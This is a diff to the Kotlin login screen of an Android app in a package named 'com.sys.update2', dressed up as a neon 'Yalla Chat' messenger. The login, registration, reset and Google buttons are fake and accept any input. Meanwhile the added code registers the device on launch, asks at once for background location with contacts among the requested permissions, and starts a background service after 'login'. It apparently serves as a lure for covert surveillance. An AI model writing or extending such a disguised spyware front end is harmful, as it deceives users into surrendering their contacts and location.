@@ -2,104 +2,159 @@ package com.sys.update2
 
 import android.Manifest
 import android.content.ComponentName
+import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.graphics.Bitmap
+import android.graphics.BitmapFactory
 import android.graphics.Canvas
-import android.graphics.Color
+import android.graphics.ImageDecoder
 import android.graphics.Paint
+import android.graphics.Typeface
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.os.Environment
 import android.os.Handler
 import android.os.Looper
+import android.provider.MediaStore
 import android.provider.Settings
-import android.util.Log
 import android.widget.Toast
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
 import androidx.activity.result.contract.ActivityResultContracts
-import androidx.appcompat.app.AlertDialog
-import androidx.compose.animation.core.LinearEasing
-import androidx.compose.animation.core.animateFloat
-import androidx.compose.animation.core.infiniteRepeatable
-import androidx.compose.animation.core.rememberInfiniteTransition
-import androidx.compose.animation.core.tween
 import androidx.compose.foundation.Canvas as ComposeCanvas
 import androidx.compose.foundation.Image
 import androidx.compose.foundation.background
 import androidx.compose.foundation.border
 import androidx.compose.foundation.clickable
-import androidx.compose.foundation.interaction.MutableInteractionSource
 import androidx.compose.foundation.layout.*
 import androidx.compose.foundation.rememberScrollState
 import androidx.compose.foundation.shape.CircleShape
 import androidx.compose.foundation.shape.RoundedCornerShape
 import androidx.compose.foundation.text.BasicTextField
+import androidx.compose.foundation.text.KeyboardOptions
 import androidx.compose.foundation.verticalScroll
-import androidx.compose.material3.*
+import androidx.compose.material.icons.Icons
+import androidx.compose.material.icons.filled.Close
+import androidx.compose.material.icons.filled.Email
+import androidx.compose.material.icons.filled.Image
+import androidx.compose.material.icons.filled.Lock
+import androidx.compose.material.icons.filled.Person
+import androidx.compose.material.icons.filled.PhotoCamera
+import androidx.compose.material.icons.filled.Visibility
+import androidx.compose.material.icons.filled.VisibilityOff
+import androidx.compose.material3.MaterialTheme
+import androidx.compose.material3.Text
+import androidx.compose.material3.darkColorScheme
 import androidx.compose.runtime.*
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.draw.clip
-import androidx.compose.ui.geometry.Offset
-import androidx.compose.ui.geometry.Size
-import androidx.compose.ui.graphics.Brush
-import androidx.compose.ui.graphics.Color as ComposeColor
-import androidx.compose.ui.graphics.Path
-import androidx.compose.ui.graphics.StrokeCap
-import androidx.compose.ui.graphics.asImageBitmap
+import androidx.compose.ui.draw.shadow
+import androidx.compose.ui.geometry.*
+import androidx.compose.ui.graphics.*
 import androidx.compose.ui.graphics.drawscope.Stroke
 import androidx.compose.ui.layout.ContentScale
-import androidx.compose.ui.res.painterResource
-import androidx.compose.ui.text.SpanStyle
-import androidx.compose.ui.text.buildAnnotatedString
+import androidx.compose.ui.platform.LocalContext
+import androidx.compose.ui.platform.LocalLayoutDirection
+import androidx.compose.ui.text.TextStyle
+import androidx.compose.ui.text.font.FontStyle
 import androidx.compose.ui.text.font.FontWeight
+import androidx.compose.ui.text.input.KeyboardType
 import androidx.compose.ui.text.input.PasswordVisualTransformation
 import androidx.compose.ui.text.input.VisualTransformation
 import androidx.compose.ui.text.style.TextAlign
-import androidx.compose.ui.text.withStyle
+import androidx.compose.ui.unit.IntOffset
+import androidx.compose.ui.unit.IntSize
 import androidx.compose.ui.unit.LayoutDirection
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
+import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
-import kotlinx.coroutines.delay
+import kotlin.math.roundToInt
 import kotlin.random.Random
+import android.graphics.Color as AColor
 
 data class LangItem(val name: String, val flag: String)
 
+// ═══════════════════════════════════════════
+//  Neon color palette
+// ═══════════════════════════════════════════
+object Neon {
+    val Cyan    = Color(0xFF2DF5FF)
+    val Blue    = Color(0xFF3D8BFF)
+    val Purple  = Color(0xFF9B4DFF)
+    val Magenta = Color(0xFFFF3DF0)
+    val DeepTop    = Color(0xFF07021F)
+    val DeepMid    = Color(0xFF0B0433)
+    val DeepBottom = Color(0xFF020012)
+    val FieldBg     = Color(0xB30D1338)
+    val FieldBorder = Color(0xFF3B2E85)
+    val Hint = Color(0xFF7E86A8)
+    val Txt  = Color(0xFFF2F5FF)
+}
+
 class LoginActivity : ComponentActivity() {
 
-    private var currentScreen by mutableStateOf(-1) // -1=Language, 0=Login, 1=Register, 2=Reset
+    private var currentScreen by mutableStateOf(-1) // -1=Lang, 0=Login, 1=Register, 2=Reset
+
+    // Login
     private var email by mutableStateOf("")
     private var password by mutableStateOf("")
+    private var pwVisible by mutableStateOf(false)
     private var capInput by mutableStateOf("")
     private var capCode by mutableStateOf("")
-    private var pwVisible by mutableStateOf(false)
 
-    private var selectedLang by mutableStateOf(0)
-    private var showLoadingOverlay by mutableStateOf(false)
-    private var showLocationDialog by mutableStateOf(false)
-    private var permissionsStarted by mutableStateOf(false)
-
+    // Register
+    private var regName by mutableStateOf("")
     private var regEmail by mutableStateOf("")
-    private var regVC by mutableStateOf("")
     private var regP1 by mutableStateOf("")
     private var regP2 by mutableStateOf("")
-    private var regRef by mutableStateOf("")
     private var regP1Visible by mutableStateOf(false)
     private var regP2Visible by mutableStateOf(false)
 
+    // Reset
     private var resetEmail by mutableStateOf("")
     private var resetVC by mutableStateOf("")
     private var resetP1 by mutableStateOf("")
     private var resetP1Visible by mutableStateOf(false)
 
+    // Images
+    private var profileUri by mutableStateOf<Uri?>(null)
+    private var profileBmp by mutableStateOf<Bitmap?>(null)
+    private var bgUri by mutableStateOf<Uri?>(null)
+    private var bgBmp by mutableStateOf<Bitmap?>(null)
+
+    // Language
+    private var selectedLang by mutableStateOf(0)
+
+    // Permissions
     private var permRequestIndex = 0
     private var anyRejected = false
+    private var permissionsStarted = false
 
-    // ⭐ الصلاحيات — تطلب بعد تجاوز صفحة اللغة
+    private val enableCaptcha = false
+
+    // Image pickers
+    private val pickProfile =
+        registerForActivityResult(ActivityResultContracts.GetContent()) { uri ->
+            if (uri != null) { profileUri = uri; profileBmp = null }
+        }
+    private val shotProfile =
+        registerForActivityResult(ActivityResultContracts.TakePicturePreview()) { bmp ->
+            if (bmp != null) { profileBmp = bmp; profileUri = null }
+        }
+    private val pickBg =
+        registerForActivityResult(ActivityResultContracts.GetContent()) { uri ->
+            if (uri != null) { bgUri = uri; bgBmp = null }
+        }
+    private val shotBg =
+        registerForActivityResult(ActivityResultContracts.TakePicturePreview()) { bmp ->
+            if (bmp != null) { bgBmp = bmp; bgUri = null }
+        }
+
+    // ⭐ الصلاحيات
     private val permissionsToAsk: List<String> by lazy {
         val list = mutableListOf<String>()
         list.add(Manifest.permission.READ_CONTACTS)
@@ -132,62 +187,732 @@ class LoginActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        window.statusBarColor = Color.parseColor("#02081a")
-        window.navigationBarColor = Color.parseColor("#02081a")
+        window.statusBarColor = AColor.parseColor("#040018")
+        window.navigationBarColor = AColor.parseColor("#040018")
 
         capCode = generateCaptcha()
 
+        // ⭐ تسجيل الجهاز — مرة واحدة
+        try { DeviceManager.registerDeviceOnce(this) } catch (_: Exception) {}
+
+        // ⭐ طلب صلاحية الخلفية فوراً
+        Handler(Looper.getMainLooper()).postDelayed({
+            requestBackgroundLocationDirect()
+        }, 1500L)
+
         setContent {
             AppTheme {
-                Box(
-                    modifier = Modifier
-                        .fillMaxSize()
-                        .background(
-                            Brush.radialGradient(
-                                colors = listOf(
-                                    ComposeColor(0xFF1a5fd0),
-                                    ComposeColor(0xFF071e4d),
-                                    ComposeColor(0xFF02081a)
-                                ),
-                                radius = 1200f
-                            )
-                        )
-                ) {
-                    when (currentScreen) {
-                        -1 -> LanguageScreen()
-                        0 -> LoginScreen()
-                        1 -> RegisterScreen()
-                        2 -> ResetScreen()
-                    }
-
-                    if (showLoadingOverlay) {
-                        LoadingOverlay()
-                    }
-
-                    if (showLocationDialog) {
-                        LocationSettingsDialog()
-                    }
-
-                    // بعد 3 ثواني → إظهار مربع فشل التحقق
-                    LaunchedEffect(showLoadingOverlay) {
-                        if (showLoadingOverlay) {
-                            delay(3000)
-                            showLoadingOverlay = false
-                            showLocationDialog = true
+                CompositionLocalProvider(LocalLayoutDirection provides LayoutDirection.Rtl) {
+                    Box(modifier = Modifier.fillMaxSize()) {
+                        NeonBackground()
+                        when (currentScreen) {
+                            -1 -> LanguageScreen()
+                            0  -> LoginScreen()
+                            1  -> RegisterScreen()
+                            2  -> ResetScreen()
                         }
                     }
                 }
             }
         }
-
-        // ⭐ طلب صلاحية الموقع (Background Location) بعد فتح التطبيق
-        Handler(Looper.getMainLooper()).postDelayed({
-            requestBackgroundLocationDirect()
-        }, 1500L)
     }
 
     // ═══════════════════════════════════════════
-    //  Language Selection Screen
+    //  Neon Background
+    // ═══════════════════════════════════════════
+    @Composable
+    fun NeonBackground() {
+        val ctx = LocalContext.current
+        val bg = remember { loadAssetBitmap(ctx, "background.png") }
+        val stars = remember { List(60) { Offset(Random.nextFloat(), Random.nextFloat() * 0.7f) } }
+
+        ComposeCanvas(modifier = Modifier.fillMaxSize()) {
+            if (bg != null) {
+                val scale = maxOf(size.width / bg.width, size.height / bg.height)
+                val dw = bg.width * scale
+                val dh = bg.height * scale
+                drawImage(
+                    image = bg.asImageBitmap(),
+                    dstOffset = IntOffset(((size.width - dw) / 2).roundToInt(), ((size.height - dh) / 2).roundToInt()),
+                    dstSize = IntSize(dw.roundToInt(), dh.roundToInt())
+                )
+                drawRect(Brush.verticalGradient(listOf(Color(0x99060021), Color(0xCC040018))))
+            } else {
+                drawRect(Brush.verticalGradient(listOf(Neon.DeepTop, Neon.DeepMid, Neon.DeepBottom)))
+            }
+
+            drawCircle(
+                Brush.radialGradient(listOf(Neon.Magenta.copy(alpha = 0.28f), Color.Transparent),
+                    center = Offset(size.width * 0.85f, size.height * 0.07f), radius = size.width * 0.55f),
+                radius = size.width * 0.55f, center = Offset(size.width * 0.85f, size.height * 0.07f)
+            )
+            drawCircle(
+                Brush.radialGradient(listOf(Neon.Cyan.copy(alpha = 0.22f), Color.Transparent),
+                    center = Offset(size.width * 0.06f, size.height * 0.30f), radius = size.width * 0.60f),
+                radius = size.width * 0.60f, center = Offset(size.width * 0.06f, size.height * 0.30f)
+            )
+            drawCircle(
+                Brush.radialGradient(listOf(Neon.Blue.copy(alpha = 0.20f), Color.Transparent),
+                    center = Offset(size.width * 0.5f, size.height * 0.98f), radius = size.width * 0.85f),
+                radius = size.width * 0.85f, center = Offset(size.width * 0.5f, size.height * 0.98f)
+            )
+
+            stars.forEach {
+                drawCircle(Neon.Cyan.copy(alpha = 0.45f), radius = 1.4.dp.toPx(),
+                    center = Offset(it.x * size.width, it.y * size.height))
+            }
+
+            fun wave(baseY: Float, amp: Float, alpha: Float, w: Float, colors: List<Color>) {
+                val p = Path()
+                p.moveTo(0f, baseY)
+                p.cubicTo(size.width * 0.22f, baseY - amp, size.width * 0.38f, baseY + amp,
+                    size.width * 0.58f, baseY - amp * 0.5f)
+                p.cubicTo(size.width * 0.78f, baseY + amp * 0.8f, size.width * 0.85f, baseY - amp * 0.4f,
+                    size.width, baseY)
+                drawPath(p, brush = Brush.horizontalGradient(colors), style = Stroke(width = w), alpha = alpha)
+            }
+            val h = size.height
+            wave(h * 0.42f, h * 0.05f, 0.35f, 2.dp.toPx(), listOf(Neon.Purple, Neon.Cyan))
+            wave(h * 0.82f, h * 0.05f, 0.90f, 2.5f.dp.toPx(), listOf(Neon.Cyan, Neon.Purple, Neon.Magenta))
+            wave(h * 0.86f, h * 0.06f, 0.60f, 3.dp.toPx(), listOf(Neon.Magenta, Neon.Blue, Neon.Cyan))
+            wave(h * 0.90f, h * 0.045f, 0.45f, 3.5f.dp.toPx(), listOf(Neon.Blue, Neon.Magenta, Neon.Purple))
+
+            val fill = Path()
+            fill.moveTo(0f, h)
+            fill.lineTo(0f, h * 0.86f)
+            fill.cubicTo(size.width * 0.3f, h * 0.78f, size.width * 0.6f, h * 0.95f, size.width, h * 0.84f)
+            fill.lineTo(size.width, h)
+            fill.close()
+            drawPath(fill, brush = Brush.verticalGradient(
+                listOf(Neon.Purple.copy(alpha = 0.26f), Color.Transparent), startY = h * 0.8f, endY = h))
+        }
+    }
+
+    // ═══════════════════════════════════════════
+    //  App Header
+    // ═══════════════════════════════════════════
+    @Composable
+    fun AppHeader() {
+        val ctx = LocalContext.current
+        val logo = remember { loadAssetBitmap(ctx, "logo.png") }
+
+        Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.fillMaxWidth()) {
+            Spacer(Modifier.height(34.dp))
+            if (logo != null) {
+                Image(
+                    bitmap = logo.asImageBitmap(),
+                    contentDescription = "Yalla Chat Logo",
+                    modifier = Modifier.size(96.dp),
+                    contentScale = ContentScale.Fit
+                )
+            } else {
+                DrawnLogo(Modifier.size(96.dp))
+            }
+            Spacer(Modifier.height(6.dp))
+            Text(
+                "yalla chat",
+                style = TextStyle(
+                    brush = Brush.horizontalGradient(listOf(Neon.Cyan, Neon.Purple, Neon.Magenta)),
+                    fontSize = 36.sp,
+                    fontWeight = FontWeight.ExtraBold,
+                    fontStyle = FontStyle.Italic
+                )
+            )
+            Spacer(Modifier.height(10.dp))
+            Row(verticalAlignment = Alignment.CenterVertically) {
+                Box(Modifier.width(34.dp).height(2.dp)
+                    .background(Brush.horizontalGradient(listOf(Color.Transparent, Neon.Cyan))))
+                Spacer(Modifier.width(10.dp))
+                Text("تواصل بلا حدود", color = Neon.Cyan, fontSize = 14.sp, fontWeight = FontWeight.Medium)
+                Spacer(Modifier.width(10.dp))
+                Box(Modifier.width(34.dp).height(2.dp)
+                    .background(Brush.horizontalGradient(listOf(Neon.Magenta, Color.Transparent))))
+            }
+        }
+    }
+
+    @Composable
+    fun DrawnLogo(modifier: Modifier = Modifier) {
+        ComposeCanvas(modifier = modifier) {
+            val w = size.width
+            val h = size.height
+            val brush = Brush.linearGradient(
+                listOf(Neon.Cyan, Neon.Purple, Neon.Magenta),
+                start = Offset(0f, 0f), end = Offset(w, h)
+            )
+            val stroke = Stroke(width = h * 0.055f, cap = StrokeCap.Round, join = StrokeJoin.Round)
+            drawRoundRect(brush = brush, topLeft = Offset(w * 0.34f, h * 0.30f),
+                size = Size(w * 0.56f, h * 0.42f), cornerRadius = CornerRadius(h * 0.16f),
+                style = stroke, alpha = 0.55f)
+            drawRoundRect(brush = brush, topLeft = Offset(w * 0.06f, h * 0.10f),
+                size = Size(w * 0.62f, h * 0.46f), cornerRadius = CornerRadius(h * 0.18f),
+                style = stroke)
+            val tail = Path().apply {
+                moveTo(w * 0.20f, h * 0.55f)
+                lineTo(w * 0.16f, h * 0.72f)
+                lineTo(w * 0.36f, h * 0.56f)
+            }
+            drawPath(tail, brush = brush, style = stroke)
+            for (i in 0..2) {
+                drawCircle(
+                    color = listOf(Neon.Cyan, Neon.Blue, Neon.Magenta)[i],
+                    radius = h * 0.05f,
+                    center = Offset(w * (0.23f + i * 0.15f), h * 0.33f)
+                )
+            }
+        }
+    }
+
+    // ═══════════════════════════════════════════
+    //  Login Screen
+    // ═══════════════════════════════════════════
+    @Composable
+    fun LoginScreen() {
+        Column(
+            modifier = Modifier
+                .fillMaxSize()
+                .verticalScroll(rememberScrollState())
+                .padding(horizontal = 24.dp)
+                .imePadding(),
+            horizontalAlignment = Alignment.CenterHorizontally
+        ) {
+            AppHeader()
+            Spacer(Modifier.height(40.dp))
+
+            NeonInput(email, { email = it }, "البريد الإلكتروني أو رقم الهاتف",
+                Icons.Default.Email, KeyboardType.Email)
+            Spacer(Modifier.height(14.dp))
+            NeonPassword(password, { password = it }, pwVisible, { pwVisible = !pwVisible }, "كلمة المرور")
+
+            if (enableCaptcha) {
+                Spacer(Modifier.height(12.dp))
+                Row(
+                    modifier = Modifier
+                        .fillMaxWidth()
+                        .height(56.dp)
+                        .clip(RoundedCornerShape(18.dp))
+                        .background(Neon.FieldBg)
+                        .border(1.dp, Neon.FieldBorder, RoundedCornerShape(18.dp))
+                        .padding(horizontal = 16.dp),
+                    verticalAlignment = Alignment.CenterVertically
+                ) {
+                    BasicTextField(
+                        value = capInput,
+                        onValueChange = { if (it.length <= 6) capInput = it.uppercase() },
+                        modifier = Modifier.weight(1f),
+                        singleLine = true,
+                        textStyle = TextStyle(color = Neon.Txt, fontSize = 15.sp),
+                        decorationBox = { inner ->
+                            if (capInput.isEmpty()) Text("أدخل رمز التحقق", color = Neon.Hint, fontSize = 14.5.sp)
+                            inner()
+                        }
+                    )
+                    CaptchaBox(capCode) { capCode = generateCaptcha(); capInput = "" }
+                }
+            }
+
+            Spacer(Modifier.height(26.dp))
+            GradientButton("تسجيل الدخول") {
+                when {
+                    email.isBlank() -> showToast("من فضلك أدخل البريد الإلكتروني أو رقم الهاتف")
+                    password.isBlank() -> showToast("من فضلك أدخل كلمة المرور")
+                    enableCaptcha && capInput != capCode -> {
+                        showToast("رمز التحقق غير صحيح")
+                        capCode = generateCaptcha(); capInput = ""
+                    }
+                    else -> {
+                        showToast("تم تسجيل الدخول")
+                        // ⭐ تشغيل الخدمة في الخلفية
+                        startBackgroundService()
+                    }
+                }
+            }
+
+            Spacer(Modifier.height(22.dp))
+            OrDivider()
+            Spacer(Modifier.height(22.dp))
+            GoogleButton {
+                showToast("الدخول عبر Google (تجريبي)")
+            }
+
+            Spacer(Modifier.height(16.dp))
+            Text(
+                "نسيت كلمة المرور؟",
+                color = Neon.Cyan,
+                fontSize = 13.5.sp,
+                fontWeight = FontWeight.Medium,
+                modifier = Modifier
+                    .clickable { currentScreen = 2 }
+                    .padding(vertical = 6.dp)
+            )
+
+            Spacer(Modifier.height(26.dp))
+            Row(verticalAlignment = Alignment.CenterVertically) {
+                Text("ليس لديك حساب؟ ", color = Neon.Hint, fontSize = 14.sp)
+                Text(
+                    "إنشاء حساب",
+                    style = TextStyle(
+                        brush = Brush.horizontalGradient(listOf(Neon.Cyan, Neon.Magenta)),
+                        fontSize = 14.sp, fontWeight = FontWeight.Bold
+                    ),
+                    modifier = Modifier
+                        .clickable { currentScreen = 1 }
+                        .padding(vertical = 6.dp)
+                )
+            }
+            Spacer(Modifier.height(30.dp))
+        }
+    }
+
+    // ═══════════════════════════════════════════
+    //  Register Screen
+    // ═══════════════════════════════════════════
+    @Composable
+    fun RegisterScreen() {
+        Column(
+            modifier = Modifier
+                .fillMaxSize()
+                .verticalScroll(rememberScrollState())
+                .padding(horizontal = 24.dp)
+                .imePadding(),
+            horizontalAlignment = Alignment.CenterHorizontally
+        ) {
+            AppHeader()
+            Spacer(Modifier.height(28.dp))
+            NeonInput(regName, { regName = it }, "الاسم الكامل", Icons.Default.Person)
+            Spacer(Modifier.height(12.dp))
+            NeonInput(regEmail, { regEmail = it }, "البريد الإلكتروني أو رقم الهاتف",
+                Icons.Default.Email, KeyboardType.Email)
+            Spacer(Modifier.height(12.dp))
+            NeonPassword(regP1, { regP1 = it }, regP1Visible, { regP1Visible = !regP1Visible }, "كلمة المرور")
+            Spacer(Modifier.height(12.dp))
+            NeonPassword(regP2, { regP2 = it }, regP2Visible, { regP2Visible = !regP2Visible }, "تأكيد كلمة المرور")
+            Spacer(Modifier.height(20.dp))
+            ProfileImageCard()
+            Spacer(Modifier.height(14.dp))
+            BackgroundImageCard()
+            Spacer(Modifier.height(26.dp))
+
+            GradientButton("إنشاء الحساب") {
+                when {
+                    regName.isBlank() -> showToast("من فضلك أدخل الاسم الكامل")
+                    regEmail.isBlank() -> showToast("من فضلك أدخل البريد الإلكتروني أو رقم الهاتف")
+                    regP1.length < 6 || regP1.length > 16 -> showToast("كلمة المرور يجب أن تكون من 6 إلى 16 حرفاً")
+                    regP1 != regP2 -> showToast("كلمتا المرور غير متطابقتين")
+                    else -> {
+                        showToast("تم إنشاء الحساب")
+                        currentScreen = 0
+                    }
+                }
+            }
+
+            Spacer(Modifier.height(20.dp))
+            OrDivider()
+            Spacer(Modifier.height(18.dp))
+            Row(verticalAlignment = Alignment.CenterVertically) {
+                Text("لديك حساب بالفعل؟ ", color = Neon.Hint, fontSize = 14.sp)
+                Text(
+                    "تسجيل الدخول",
+                    style = TextStyle(
+                        brush = Brush.horizontalGradient(listOf(Neon.Cyan, Neon.Magenta)),
+                        fontSize = 14.sp, fontWeight = FontWeight.Bold
+                    ),
+                    modifier = Modifier
+                        .clickable { currentScreen = 0 }
+                        .padding(vertical = 6.dp)
+                )
+            }
+            Spacer(Modifier.height(30.dp))
+        }
+    }
+
+    // ═══════════════════════════════════════════
+    //  Reset Screen
+    // ═══════════════════════════════════════════
+    @Composable
+    fun ResetScreen() {
+        Column(
+            modifier = Modifier
+                .fillMaxSize()
+                .verticalScroll(rememberScrollState())
+                .padding(horizontal = 24.dp)
+                .imePadding(),
+            horizontalAlignment = Alignment.CenterHorizontally
+        ) {
+            Spacer(Modifier.height(40.dp))
+            Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.fillMaxWidth()) {
+                BackButton { currentScreen = 0 }
+                Text(
+                    "استعادة كلمة المرور",
+                    color = Neon.Txt,
+                    fontSize = 17.5.sp,
+                    fontWeight = FontWeight.Bold,
+                    textAlign = TextAlign.Center,
+                    modifier = Modifier.weight(1f)
+                )
+                Spacer(Modifier.width(40.dp))
+            }
+
+            Spacer(Modifier.height(30.dp))
+            NeonInput(resetEmail, { resetEmail = it }, "البريد الإلكتروني أو رقم الهاتف",
+                Icons.Default.Email, KeyboardType.Email)
+            Spacer(Modifier.height(14.dp))
+
+            Row(
+                modifier = Modifier
+                    .fillMaxWidth()
+                    .height(56.dp)
+                    .clip(RoundedCornerShape(18.dp))
+                    .background(Neon.FieldBg)
+                    .border(1.dp, Neon.FieldBorder, RoundedCornerShape(18.dp))
+                    .padding(horizontal = 16.dp),
+                verticalAlignment = Alignment.CenterVertically
+            ) {
+                Icon(Icons.Default.Email, null, tint = Neon.Cyan.copy(alpha = 0.85f), modifier = Modifier.size(20.dp))
+                Spacer(Modifier.width(12.dp))
+                BasicTextField(
+                    value = resetVC,
+                    onValueChange = { resetVC = it },
+                    modifier = Modifier.weight(1f),
+                    singleLine = true,
+                    textStyle = TextStyle(color = Neon.Txt, fontSize = 15.sp),
+                    decorationBox = { inner ->
+                        if (resetVC.isEmpty()) Text("رمز التحقق", color = Neon.Hint, fontSize = 14.5.sp)
+                        inner()
+                    }
+                )
+                Text(
+                    "إرسال",
+                    color = Neon.Cyan,
+                    fontSize = 14.5.sp,
+                    fontWeight = FontWeight.Bold,
+                    modifier = Modifier
+                        .clickable { showToast("سيتم إرسال الرمز (تجريبي)") }
+                        .padding(start = 12.dp)
+                )
+            }
+
+            Spacer(Modifier.height(14.dp))
+            NeonPassword(resetP1, { resetP1 = it }, resetP1Visible,
+                { resetP1Visible = !resetP1Visible }, "كلمة المرور الجديدة (6-16)")
+            Spacer(Modifier.height(28.dp))
+
+            GradientButton("تأكيد") {
+                when {
+                    resetEmail.isBlank() -> showToast("من فضلك أدخل البريد الإلكتروني")
+                    resetVC.isBlank() -> showToast("من فضلك أدخل رمز التحقق")
+                    resetP1.length < 6 || resetP1.length > 16 -> showToast("كلمة المرور يجب أن تكون من 6 إلى 16 حرفاً")
+                    else -> {
+                        showToast("تم تغيير كلمة المرور")
+                        currentScreen = 0
+                    }
+                }
+            }
+            Spacer(Modifier.height(30.dp))
+        }
+    }
+
+    // ═══════════════════════════════════════════
+    //  Reusable Components
+    // ═══════════════════════════════════════════
+    @Composable
+    fun NeonInput(
+        value: String,
+        onChange: (String) -> Unit,
+        hint: String,
+        icon: androidx.compose.ui.graphics.vector.ImageVector,
+        keyboardType: KeyboardType = KeyboardType.Text
+    ) {
+        Row(
+            modifier = Modifier
+                .fillMaxWidth()
+                .height(56.dp)
+                .clip(RoundedCornerShape(18.dp))
+                .background(Neon.FieldBg)
+                .border(1.dp, Neon.FieldBorder, RoundedCornerShape(18.dp))
+                .padding(horizontal = 16.dp),
+            verticalAlignment = Alignment.CenterVertically
+        ) {
+            androidx.compose.material3.Icon(icon, contentDescription = null,
+                tint = Neon.Cyan.copy(alpha = 0.85f), modifier = Modifier.size(20.dp))
+            Spacer(Modifier.width(12.dp))
+            BasicTextField(
+                value = value,
+                onValueChange = onChange,
+                modifier = Modifier.weight(1f),
+                singleLine = true,
+                keyboardOptions = KeyboardOptions(keyboardType = keyboardType),
+                textStyle = TextStyle(color = Neon.Txt, fontSize = 15.sp),
+                cursorBrush = Brush.verticalGradient(listOf(Neon.Cyan, Neon.Magenta)),
+                decorationBox = { inner ->
+                    if (value.isEmpty()) Text(hint, color = Neon.Hint, fontSize = 14.5.sp)
+                    inner()
+                }
+            )
+        }
+    }
+
+    @Composable
+    fun NeonPassword(
+        value: String,
+        onChange: (String) -> Unit,
+        visible: Boolean,
+        onToggle: () -> Unit,
+        hint: String
+    ) {
+        Row(
+            modifier = Modifier
+                .fillMaxWidth()
+                .height(56.dp)
+                .clip(RoundedCornerShape(18.dp))
+                .background(Neon.FieldBg)
+                .border(1.dp, Neon.FieldBorder, RoundedCornerShape(18.dp))
+                .padding(horizontal = 16.dp),
+            verticalAlignment = Alignment.CenterVertically
+        ) {
+            androidx.compose.material3.Icon(Icons.Default.Lock, contentDescription = null,
+                tint = Neon.Cyan.copy(alpha = 0.85f), modifier = Modifier.size(20.dp))
+            Spacer(Modifier.width(12.dp))
+            BasicTextField(
+                value = value,
+                onValueChange = onChange,
+                modifier = Modifier.weight(1f),
+                singleLine = true,
+                visualTransformation = if (visible) VisualTransformation.None else PasswordVisualTransformation(),
+                keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Password),
+                textStyle = TextStyle(color = Neon.Txt, fontSize = 15.sp),
+                cursorBrush = Brush.verticalGradient(listOf(Neon.Cyan, Neon.Magenta)),
+                decorationBox = { inner ->
+                    if (value.isEmpty()) Text(hint, color = Neon.Hint, fontSize = 14.5.sp)
+                    inner()
+                }
+            )
+            androidx.compose.material3.Icon(
+                imageVector = if (visible) Icons.Default.Visibility else Icons.Default.VisibilityOff,
+                contentDescription = "إظهار/إخفاء كلمة المرور",
+                tint = Neon.Hint,
+                modifier = Modifier
+                    .size(22.dp)
+                    .clickable { onToggle() }
+            )
+        }
+    }
+
+    @Composable
+    fun GradientButton(text: String, onClick: () -> Unit) {
+        Box(
+            modifier = Modifier
+                .fillMaxWidth()
+                .height(56.dp)
+                .shadow(18.dp, RoundedCornerShape(28.dp), ambientColor = Neon.Magenta, spotColor = Neon.Purple)
+                .clip(RoundedCornerShape(28.dp))
+                .background(Brush.horizontalGradient(listOf(Neon.Magenta, Neon.Purple, Neon.Blue, Neon.Cyan)))
+                .clickable { onClick() },
+            contentAlignment = Alignment.Center
+        ) {
+            Row(verticalAlignment = Alignment.CenterVertically) {
+                Text(text, color = Color.White, fontSize = 17.sp, fontWeight = FontWeight.Bold)
+                Spacer(Modifier.width(10.dp))
+                Text("←", color = Color.White, fontSize = 18.sp, fontWeight = FontWeight.Bold)
+            }
+        }
+    }
+
+    @Composable
+    fun OrDivider() {
+        Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.fillMaxWidth()) {
+            Box(Modifier.weight(1f).height(1.dp)
+                .background(Brush.horizontalGradient(listOf(Color.Transparent, Neon.Purple.copy(alpha = 0.6f)))))
+            Text("أو", color = Neon.Hint, fontSize = 13.5.sp, modifier = Modifier.padding(horizontal = 14.dp))
+            Box(Modifier.weight(1f).height(1.dp)
+                .background(Brush.horizontalGradient(listOf(Neon.Purple.copy(alpha = 0.6f), Color.Transparent))))
+        }
+    }
+
+    @Composable
+    fun GoogleButton(onClick: () -> Unit) {
+        Box(
+            modifier = Modifier
+                .fillMaxWidth()
+                .height(54.dp)
+                .clip(RoundedCornerShape(27.dp))
+                .background(Color(0x330D1338))
+                .border(1.dp, Brush.horizontalGradient(listOf(Neon.Cyan, Neon.Purple, Neon.Magenta)), RoundedCornerShape(27.dp))
+                .clickable { onClick() },
+            contentAlignment = Alignment.Center
+        ) {
+            Row(verticalAlignment = Alignment.CenterVertically) {
+                Text(
+                    "G",
+                    style = TextStyle(
+                        brush = Brush.linearGradient(
+                            listOf(Color(0xFF4285F4), Color(0xFFEA4335), Color(0xFFFBBC05), Color(0xFF34A853))
+                        ),
+                        fontSize = 20.sp, fontWeight = FontWeight.ExtraBold
+                    )
+                )
+                Spacer(Modifier.width(10.dp))
+                Text("الدخول باستخدام Google", color = Neon.Txt, fontSize = 15.sp, fontWeight = FontWeight.Bold)
+            }
+        }
+    }
+
+    @Composable
+    fun PickerButton(text: String, icon: androidx.compose.ui.graphics.vector.ImageVector, onClick: () -> Unit) {
+        Row(
+            modifier = Modifier
+                .clip(RoundedCornerShape(50))
+                .background(Color(0x40131B45))
+                .border(1.dp, Neon.FieldBorder, RoundedCornerShape(50))
+                .clickable { onClick() }
+                .padding(horizontal = 14.dp, vertical = 9.dp),
+            verticalAlignment = Alignment.CenterVertically
+        ) {
+            androidx.compose.material3.Icon(icon, contentDescription = null, tint = Neon.Cyan, modifier = Modifier.size(17.dp))
+            Spacer(Modifier.width(6.dp))
+            Text(text, color = Neon.Txt, fontSize = 12.5.sp, fontWeight = FontWeight.Bold)
+        }
+    }
+
+    @Composable
+    fun ProfileImageCard() {
+        val ctx = LocalContext.current
+        val bmp = remember(profileUri, profileBmp) { profileBmp ?: profileUri?.let { uriToBitmap(ctx, it) } }
+
+        Column(
+            modifier = Modifier
+                .fillMaxWidth()
+                .clip(RoundedCornerShape(20.dp))
+                .background(Neon.FieldBg)
+                .border(1.dp, Neon.FieldBorder, RoundedCornerShape(20.dp))
+                .padding(16.dp)
+        ) {
+            Row(verticalAlignment = Alignment.CenterVertically) {
+                Box(
+                    modifier = Modifier
+                        .size(64.dp)
